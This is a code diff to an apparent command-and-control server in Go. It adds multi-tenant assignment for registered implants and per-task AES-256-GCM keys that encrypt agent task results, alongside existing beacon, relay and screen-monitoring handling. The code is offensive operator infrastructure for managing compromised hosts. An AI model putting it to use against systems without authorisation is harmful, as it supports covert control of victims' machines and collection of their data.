@@ -87,6 +87,8 @@ type taskResult struct {
 	ResultID string `json:"rid,omitempty"`
 	// MAC is the agent's file-transfer integrity chain link (hex).
 	MAC string `json:"mac,omitempty"`
+	// EncryptedWithTaskKey flags that Output was sealed with the per-task key.
+	EncryptedWithTaskKey bool `json:"etk,omitempty"`
 }
 
 type task struct {
@@ -101,6 +103,7 @@ type task struct {
 	Size      int64  `json:"size,omitempty"`
 	PrevMAC   string `json:"prev_mac,omitempty"`
 	MAC       string `json:"mac,omitempty"`
+	Key       string `json:"key,omitempty"`
 }
 
 type relayedTask struct {
@@ -462,7 +465,10 @@ func (s *Server) ensureBeaconImplantRow(agentID string) {
 	if res.Error != gorm.ErrRecordNotFound {
 		return
 	}
-	row := db.Implant{ID: agentID, LastSeen: time.Now(), Status: "online"}
+	// Fresh rows fall into the bootstrap "default" tenant so multi-tenant
+	// isolation (tenantScope) never hides a newly-registered agent from the
+	// owning operator.
+	row := db.Implant{ID: agentID, TenantID: s.defaultTenantID(), LastSeen: time.Now(), Status: "online"}
 	if err := s.db.Create(&row).Error; err != nil {
 		// Concurrent create for the same UUID: someone else won the race.
 		slog.Debug("ensureBeaconImplantRow create skipped", "agent_id", agentID, "error", err)
@@ -920,6 +926,7 @@ func (s *Server) processAgentRegistration(req beaconRequest, publicIP string, no
 
 		agent = db.Implant{
 			ID:              req.UUID,
+			TenantID:        s.defaultTenantID(),
 			Hostname:        hostname,
 			Username:        username,
 			OS:              req.Info["os"],
@@ -1089,6 +1096,14 @@ func (s *Server) processAgentRegistration(req beaconRequest, publicIP string, no
 			updates["protocol_version"] = req.ProtocolVersion
 		}
 
+		// Self-heal legacy rows that predate multi-tenant isolation (tenant_id=0
+		// placeholders created by ensureBeaconImplantRow before the fix). Without
+		// this, an agent registered while the server was running is invisible to
+		// its tenant via tenantScope and never shows up in the UI.
+		if agent.TenantID == 0 {
+			updates["tenant_id"] = s.defaultTenantID()
+		}
+
 		// Atomic update: only update if last_seen hasn't been changed by a concurrent beacon.
 		// Unscoped so the update still applies if the row was just restored from a
 		// soft-delete tombstone (deleted_at not yet cleared in this transaction's view).
@@ -1157,6 +1172,21 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 		if s.isDuplicateResult(uuid, r) {
 			slog.Debug("Duplicate task result dropped", "agent_id", uuid, "task_id", r.TaskID, "type", r.Type, "rid", r.ResultID)
 			continue
+		}
+		// Per-task key decryption (P2): if the agent sealed this result with the
+		// task-issued AES-256-GCM key, recover the plaintext before further
+		// processing. Failure leaves the ciphertext in place and is logged.
+		if r.EncryptedWithTaskKey {
+			if t, ok := taskMap[r.TaskID]; ok && t.TaskKey != "" {
+				if plain, err := decryptTaskKeyOutput(t.TaskKey, r.Output); err == nil {
+					r.Output = plain
+					r.EncryptedWithTaskKey = false
+				} else {
+					slog.Warn("Per-task key decryption failed", "agent_id", uuid, "task_id", r.TaskID, "err", err)
+				}
+			} else {
+				slog.Warn("Per-task key result with no stored key", "agent_id", uuid, "task_id", r.TaskID)
+			}
 		}
 		if r.Type == "screen_frame" && r.Output != "" {
 			if s.IsScreenMonitoring(uuid) {
@@ -1680,7 +1710,7 @@ func (s *Server) bindRelayChildToParent(childID, parentUUID string) bool {
 	// than causing a primary-key conflict on Create.
 	err := s.db.Unscoped().Where("id = ?", childID).First(&agent).Error
 	if err == gorm.ErrRecordNotFound {
-		row := db.Implant{ID: childID, ParentID: parentUUID, LastSeen: time.Now(), Status: "online"}
+		row := db.Implant{ID: childID, ParentID: parentUUID, TenantID: s.defaultTenantID(), LastSeen: time.Now(), Status: "online"}
 		if cerr := s.db.Create(&row).Error; cerr != nil {
 			// Concurrent create raced: re-check the winner's parent binding.
 			if rerr := s.db.Unscoped().Where("id = ?", childID).First(&agent).Error; rerr != nil {
@@ -1772,6 +1802,7 @@ func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
 			Size:    t.Size,
 			PrevMAC: t.PrevMAC,
 			MAC:     t.MAC,
+			Key:     t.TaskKey,
 		}
 		encryptTaskPayload(s, uuid, &wire)
 		tasks[i] = wire
@@ -1887,6 +1918,7 @@ func (s *Server) fetchRelayedChildTasks(parentUUID string) []relayedTask {
 				Data:    t.Data,
 				Offset:  t.Offset,
 				Size:    t.Size,
+				Key:     t.TaskKey,
 			}
 			// Child tasks travel inside the parent's response, so their
 			// sensitive fields are encrypted with the CHILD's session key.
